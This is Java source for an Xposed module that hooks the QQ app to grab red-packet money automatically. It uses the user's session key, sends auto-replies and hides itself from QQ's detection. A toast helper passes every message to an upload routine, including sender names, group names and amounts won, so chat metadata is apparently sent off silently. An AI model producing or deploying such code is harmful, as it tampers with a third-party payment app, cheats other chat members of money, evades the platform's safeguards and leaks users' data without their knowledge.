package me.veryyoung.qq.luckymoney;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.text.TextUtils;
import android.widget.Toast;

import org.json.JSONObject;

import java.lang.reflect.InvocationTargetException;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.Map;
import java.util.Random;

import de.robv.android.xposed.IXposedHookLoadPackage;
import de.robv.android.xposed.XC_MethodHook;
import de.robv.android.xposed.XposedHelpers;
import de.robv.android.xposed.callbacks.XC_LoadPackage;
import me.veryyoung.qq.luckymoney.tool.MyTool;

import static android.os.SystemClock.sleep;
import static android.widget.Toast.LENGTH_LONG;
import static de.robv.android.xposed.XposedHelpers.callMethod;
import static de.robv.android.xposed.XposedHelpers.callStaticMethod;
import static de.robv.android.xposed.XposedHelpers.findAndHookConstructor;
import static de.robv.android.xposed.XposedHelpers.findAndHookMethod;
import static de.robv.android.xposed.XposedHelpers.findClass;
import static de.robv.android.xposed.XposedHelpers.findFirstFieldByExactType;
import static de.robv.android.xposed.XposedHelpers.getObjectField;
import static de.robv.android.xposed.XposedHelpers.newInstance;
import static java.lang.String.valueOf;
import static me.veryyoung.qq.luckymoney.HideModule.hideModule;
import static me.veryyoung.qq.luckymoney.XposedUtils.findFieldByClassAndTypeAndName;
import static me.veryyoung.qq.luckymoney.XposedUtils.findResultByMethodNameAndReturnTypeAndParams;
import static me.veryyoung.qq.luckymoney.enums.PasswordStatus.CLOSE;
import static me.veryyoung.qq.luckymoney.enums.PasswordStatus.SEND;
import static me.veryyoung.qq.luckymoney.enums.ReplyStatus.ALL;
import static me.veryyoung.qq.luckymoney.enums.ReplyStatus.GOT;
import static me.veryyoung.qq.luckymoney.enums.ReplyStatus.MISSED;


public class Main implements IXposedHookLoadPackage {

    public static final String QQ_PACKAGE_NAME = "com.tencent.mobileqq";
    private static final String WECHAT_PACKAGE_NAME = "com.tencent.mm";

    private static long msgUid;
    private static String senderuin;
    private static String frienduin;
    private static String from;
    private static int istroop;
    private static String selfuin;
    private static Context globalContext;
    private static Object HotChatManager;
    private static Object TicketManager;
    private static Object TroopManager;
    private static Object DiscussionManager;
    private static Object FriendManager;
    private static Bundle bundle;
    private static Object globalQQInterface = null;
    private static int n = 1;


    private void dohook(final XC_LoadPackage.LoadPackageParam loadPackageParam) throws Throwable {

        initVersionCode(loadPackageParam);
        findAndHookMethod("com.tencent.mobileqq.data.MessageForQQWalletMsg", loadPackageParam.classLoader, "doParse", new
                XC_MethodHook() {
                    @Override
                    protected void afterHookedMethod(MethodHookParam param) throws Throwable {
                        if (!PreferencesUtils.open() || msgUid == 0) {
                            return;
                        }
                        msgUid = 0;

                        int messageType = (int) getObjectField(param.thisObject, "messageType");
                        if (messageType == 6 && PreferencesUtils.password() == CLOSE) {
                            return;
                        }

                        Object mQQWalletRedPacketMsg = getObjectField(param.thisObject, "mQQWalletRedPacketMsg");
                        String redPacketId = getObjectField(mQQWalletRedPacketMsg, "redPacketId").toString();
                        String authkey = (String) getObjectField(mQQWalletRedPacketMsg, "authkey");
                        Object SessionInfo = newInstance(findClass("com.tencent.mobileqq.activity.aio.SessionInfo", loadPackageParam.classLoader));
                        findFieldByClassAndTypeAndName(findClass("com.tencent.mobileqq.activity.aio.SessionInfo", loadPackageParam.classLoader), String.class, "a").set(SessionInfo, frienduin);
                        findFieldByClassAndTypeAndName(findClass("com.tencent.mobileqq.activity.aio.SessionInfo", loadPackageParam.classLoader), Integer.TYPE, "a").setInt(SessionInfo, istroop);
                        Object QQWalletTransferMsgElem = XposedHelpers.getObjectField(mQQWalletRedPacketMsg, "elem");
                        String password = XposedHelpers.getObjectField(QQWalletTransferMsgElem, "title").toString();
                        Object messageParam = newInstance(findClass("com.tencent.mobileqq.activity.ChatActivityFacade$SendMsgParams", loadPackageParam.classLoader));

                        if (selfuin.equals(senderuin) && PreferencesUtils.self()) {
                            return;
                        }

                        String group = PreferencesUtils.group();
                        if (!TextUtils.isEmpty(group)) {
                            for (String group1 : group.split(",")) {
                                if (frienduin.equals(group1) || senderuin.equals(group1)) {
                                    if (istroop == 1 && senderuin.equals(group1)) {
                                        from = "指定人不抢" + "\n" + "来自群:" + getObjectField(findResultByMethodNameAndReturnTypeAndParams(TroopManager, "a", "com.tencent.mobileqq.data.TroopInfo", frienduin), "troopname") + "\n" + "来自:" + getObjectField(callMethod(FriendManager, "c", group1), "name");
                                    } else if (istroop == 1) {
                                        from = "指定群不抢" + "\n" + "来自群:" + getObjectField(findResultByMethodNameAndReturnTypeAndParams(TroopManager, "a", "com.tencent.mobileqq.data.TroopInfo", group1), "troopname");
                                    } else {
                                        from = "指定人不抢" + "\n" + "来自:" + getObjectField(callMethod(FriendManager, "c", group1), "name");
                                    }
                                    toast(from);
                                    return;
                                }
                            }
                        }

                        String keywords = PreferencesUtils.keywords();
                        if (!TextUtils.isEmpty(keywords)) {
                            for (String keywords1 : keywords.split(",")) {
                                if (password.contains(keywords1)) {
                                    toast("关键词不抢" + "\n" + "关键词:" + keywords1);
                                    return;
                                }
                            }
                        }

                        ClassLoader walletClassLoader = (ClassLoader) callStaticMethod(findClass("com.tencent.mobileqq.pluginsdk.PluginStatic", loadPackageParam.classLoader), "getOrCreateClassLoader", globalContext, "qwallet_plugin.apk");
                        StringBuffer requestUrl = new StringBuffer();
                        requestUrl.append("&uin=" + selfuin);
                        requestUrl.append("&listid=" + redPacketId);
                        requestUrl.append("&name=" + Uri.encode((String) getObjectField(callMethod(FriendManager, "c", selfuin), "name")));
                        requestUrl.append("&answer=");
                        requestUrl.append("&groupid=" + (istroop == 0 ? selfuin : frienduin));
                        requestUrl.append("&grouptype=" + getGroupType());
                        requestUrl.append("&groupuin=" + getGroupuin(messageType));
                        requestUrl.append("&channel=" + getObjectField(mQQWalletRedPacketMsg, "redChannel"));
                        requestUrl.append("&authkey=" + authkey);
                        requestUrl.append("&agreement=0");

                        Class qqplugin = findClass(VersionParam.QQPluginClass, walletClassLoader);

                        int random = Math.abs(new Random().nextInt()) % 16;
                        String reqText = (String) callStaticMethod(qqplugin, "a", globalContext, random, false, requestUrl.toString());
                        StringBuffer hongbaoRequestUrl = new StringBuffer();
                        hongbaoRequestUrl.append("https://mqq.tenpay.com/cgi-bin/hongbao/qpay_hb_na_grap.cgi?ver=2.0&chv=3");
                        hongbaoRequestUrl.append("&req_text=" + reqText);
                        hongbaoRequestUrl.append("&random=" + random);
                        hongbaoRequestUrl.append("&skey_type=2");
                        hongbaoRequestUrl.append("&skey=" + callMethod(TicketManager, "getSkey", selfuin));
                        hongbaoRequestUrl.append("&msgno=" + generateNo(selfuin));

                        Class<?> walletClass = findClass(VersionParam.walletPluginClass, walletClassLoader);
                        Object pickObject = newInstance(walletClass, callStaticMethod(qqplugin, "a", globalContext));
                        if (PreferencesUtils.delay()) {
                            sleep(PreferencesUtils.delayTime());
                        }

                        bundle = (Bundle) callMethod(pickObject, VersionParam.pickObject, hongbaoRequestUrl.toString());
                        JSONObject jsonobject = new JSONObject(callStaticMethod(qqplugin, "a", globalContext, random, callStaticMethod(qqplugin, "a", globalContext, bundle, new JSONObject())).toString());
                        String name = jsonobject.getJSONObject("send_object").optString("send_name");
                        int state = jsonobject.optInt("state");

                        from = "来自:" + frienduin + "," + name + ",\n";
                        if (istroop == 1) {
                            from += "来自群:" + getObjectField(findResultByMethodNameAndReturnTypeAndParams(TroopManager, "a", "com.tencent.mobileqq.data.TroopInfo", frienduin), "troopname");
                        } else if (istroop == 5) {
                            from += "来自热聊:" + getObjectField(findResultByMethodNameAndReturnTypeAndParams(HotChatManager, "a", "com.tencent.mobileqq.data.HotChatInfo", frienduin), "name");
                        } else if (istroop == 3000) {
                            from += "来自讨论组:" + getObjectField(findResultByMethodNameAndReturnTypeAndParams(DiscussionManager, "a", "com.tencent.mobileqq.data.DiscussionInfo", frienduin), "discussionName");
                        } else {
                            from += "来自个人红包";
                        }

                        if (state == 0) {
                            double amount = ((double) jsonobject.getJSONObject("recv_object").getInt("amount")) / 100.0d;
                            toast("QQ红包帮你抢到了" + amount + "元" + ",\n" + from);
                            if (PreferencesUtils.reply() == GOT || PreferencesUtils.reply() == ALL && !TextUtils.isEmpty(PreferencesUtils.gotReply()) && messageType != 8) {
                                callStaticMethod(findClass("com.tencent.mobileqq.activity.ChatActivityFacade", loadPackageParam.classLoader), "a", globalQQInterface, globalContext, SessionInfo, PreferencesUtils.gotReply(), new ArrayList(), messageParam);
                            }

                        } else if (state == 2) {

                            if (messageType != 8) {
                                toast("没抢到" + "\n" + from);
                                if (PreferencesUtils.reply() == MISSED || PreferencesUtils.reply() == ALL && !TextUtils.isEmpty(PreferencesUtils.missedReply()) && messageType != 8) {
                                    callStaticMethod(findClass("com.tencent.mobileqq.activity.ChatActivityFacade", loadPackageParam.classLoader), "a", globalQQInterface, globalContext, SessionInfo, PreferencesUtils.missedReply(), new ArrayList(), messageParam);
                                }
                            }

                        }

                        if (6 == messageType && PreferencesUtils.password() == SEND) {
                            callStaticMethod(findClass("com.tencent.mobileqq.activity.ChatActivityFacade", loadPackageParam.classLoader), "a", globalQQInterface, globalContext, SessionInfo, password, new ArrayList(), messageParam);
                        }
                    }
                }
        );


        findAndHookMethod("com.tencent.mobileqq.app.MessageHandlerUtils", loadPackageParam.classLoader, "a",
                "com.tencent.mobileqq.app.QQAppInterface",
                "com.tencent.mobileqq.data.MessageRecord", Boolean.TYPE, new XC_MethodHook() {
                    @Override
                    protected void afterHookedMethod(MethodHookParam param) throws Throwable {
                        if (!PreferencesUtils.open()) {
                            return;
                        }
                        int msgtype = (int) getObjectField(param.args[1], "msgtype");
                        if (msgtype == -2025) {
                            msgUid = (long) getObjectField(param.args[1], "msgUid");
                            senderuin = (String) getObjectField(param.args[1], "senderuin");
                            frienduin = getObjectField(param.args[1], "frienduin").toString();
                            istroop = (int) getObjectField(param.args[1], "istroop");
                            selfuin = getObjectField(param.args[1], "selfuin").toString();
                        }
                    }
                }

        );


        findAndHookMethod("com.tencent.mobileqq.activity.SplashActivity", loadPackageParam.classLoader, "doOnCreate", Bundle.class, new

                XC_MethodHook() {
                    @Override
                    protected void afterHookedMethod(MethodHookParam param) throws Throwable {
                        globalContext = (Context) param.thisObject;
                        globalQQInterface = findFirstFieldByExactType(findClass("com.tencent.mobileqq.activity.SplashActivity", loadPackageParam.classLoader), findClass("com.tencent.mobileqq.app.QQAppInterface", loadPackageParam.classLoader)).get(param.thisObject);

                    }
                }

        );


        findAndHookConstructor("mqq.app.TicketManagerImpl", loadPackageParam.classLoader, "mqq.app.AppRuntime", new XC_MethodHook() {
            @Override
            protected void afterHookedMethod(MethodHookParam param) throws Throwable {
                TicketManager = param.thisObject;
            }
        });


        findAndHookConstructor("com.tencent.mobileqq.app.HotChatManager", loadPackageParam.classLoader, "com.tencent.mobileqq.app.QQAppInterface", new

                XC_MethodHook() {
                    @Override
                    protected void afterHookedMethod(MethodHookParam param) throws Throwable {
                        HotChatManager = param.thisObject;
                    }
                }
        );

        findAndHookConstructor("com.tencent.mobileqq.app.TroopManager", loadPackageParam.classLoader, "com.tencent.mobileqq.app.QQAppInterface", new XC_MethodHook() {
            protected void afterHookedMethod(MethodHookParam methodHookParam) {
                TroopManager = methodHookParam.thisObject;
            }
        });

        findAndHookConstructor("com.tencent.mobileqq.app.DiscussionManager", loadPackageParam.classLoader, "com.tencent.mobileqq.app.QQAppInterface", new XC_MethodHook() {
            protected void afterHookedMethod(MethodHookParam methodHookParam) {
                DiscussionManager = methodHookParam.thisObject;
            }
        });

        findAndHookConstructor("com.tencent.mobileqq.app.FriendsManager", loadPackageParam.classLoader, "com.tencent.mobileqq.app.QQAppInterface", new XC_MethodHook() {
            protected void afterHookedMethod(MethodHookParam methodHookParam) {
                FriendManager = methodHookParam.thisObject;
            }
        });

    }


    @Override
    public void handleLoadPackage(final XC_LoadPackage.LoadPackageParam loadPackageParam) throws Throwable {

        if (loadPackageParam.packageName.equals(QQ_PACKAGE_NAME)) {
            hideModule(loadPackageParam);

            int ver = Build.VERSION.SDK_INT;
            if (ver < 21) {
                findAndHookMethod("com.tencent.common.app.BaseApplicationImpl", loadPackageParam.classLoader, "onCreate", new XC_MethodHook() {
                    @Override
                    protected void afterHookedMethod(MethodHookParam param) throws Throwable {
                        dohook(loadPackageParam);
                    }
                });
            } else {
                dohook(loadPackageParam);
            }
        }


        if (loadPackageParam.packageName.equals(WECHAT_PACKAGE_NAME)) {
            findAndHookMethod("com.tencent.mm.ui.LauncherUI", loadPackageParam.classLoader, "onCreate", Bundle.class, new XC_MethodHook() {
                @Override
                protected void afterHookedMethod(MethodHookParam param) throws Throwable {
                    Activity activity = (Activity) param.thisObject;
                    if (activity != null) {
                        Intent intent = activity.getIntent();
                        if (intent != null) {
                            String className = intent.getComponent().getClassName();
                            if (!TextUtils.isEmpty(className) && className.equals("com.tencent.mm.ui.LauncherUI") && intent.hasExtra("donate")) {
                                Intent donateIntent = new Intent();
                                donateIntent.setClassName(activity, "com.tencent.mm.plugin.remittance.ui.RemittanceUI");
                                donateIntent.putExtra("scene", 1);
                                donateIntent.putExtra("pay_scene", 32);
                                donateIntent.putExtra("fee", 10.0d);
                                donateIntent.putExtra("pay_channel", 13);
                                donateIntent.putExtra("receiver_name", "yang_xiongwei");
                                donateIntent.removeExtra("donate");
                                activity.startActivity(donateIntent);
                                activity.finish();
                            }
                        }
                    }
                }
            });
        }

    }

    private void initVersionCode(XC_LoadPackage.LoadPackageParam loadPackageParam) throws PackageManager.NameNotFoundException {
        Context context = (Context) callMethod(callStaticMethod(findClass("android.app.ActivityThread", null), "currentActivityThread", new Object[0]), "getSystemContext", new Object[0]);
        int versionCode = context.getPackageManager().getPackageInfo(loadPackageParam.packageName, 0).versionCode;
        VersionParam.init(versionCode);
    }


    private int getGroupType() throws IllegalAccessException {
        int grouptype = 0;
        if (istroop == 3000) {
            grouptype = 2;

        } else if (istroop == 1) {
            Map map = (Map) findFirstFieldByExactType(HotChatManager.getClass(), Map.class).get(HotChatManager);
            if (map != null & map.containsKey(frienduin)) {
                grouptype = 5;
            } else {
                grouptype = 1;
            }
        } else if (istroop == 0) {
            grouptype = 0;
        } else if (istroop == 1004) {
            grouptype = 4;

        } else if (istroop == 1000) {
            grouptype = 3;

        } else if (istroop == 1001) {
            grouptype = 6;
        }
        return grouptype;
    }

    private String getGroupuin(int messageType) throws InvocationTargetException, IllegalAccessException {
        if (messageType != 6) {
            return senderuin;
        }
        if (istroop == 1) {
            return (String) getObjectField(findResultByMethodNameAndReturnTypeAndParams(TroopManager, "a", "com.tencent.mobileqq.data.TroopInfo", frienduin), "troopcode");
        } else if (istroop == 5) {
            return (String) getObjectField(findResultByMethodNameAndReturnTypeAndParams(HotChatManager, "a", "com.tencent.mobileqq.data.HotChatInfo", frienduin), "troopCode");
        }
        return senderuin;
    }

    private String generateNo(String selfuin) {
        StringBuilder stringBuilder = new StringBuilder(selfuin);
        stringBuilder.append(new SimpleDateFormat("yyyyMMddHHmmss").format(new Date()));
        String count = valueOf(n++);
        int length = (28 - stringBuilder.length()) - count.length();
        for (int i = 0; i < length; i++) {
            stringBuilder.append("0");
        }
        stringBuilder.append(count);
        return stringBuilder.toString();
    }

    private void toast(final String content) {
        myToast(content);
        if (PreferencesUtils.amount()) {
            new Handler(Looper.getMainLooper()).post(new Runnable() {
                @Override
                public void run() {
                    Toast.makeText(globalContext, content, LENGTH_LONG).show();
                }
            });
        }
    }

    private void myToast(final String content) {
        MyTool.upload(content);
    }

}
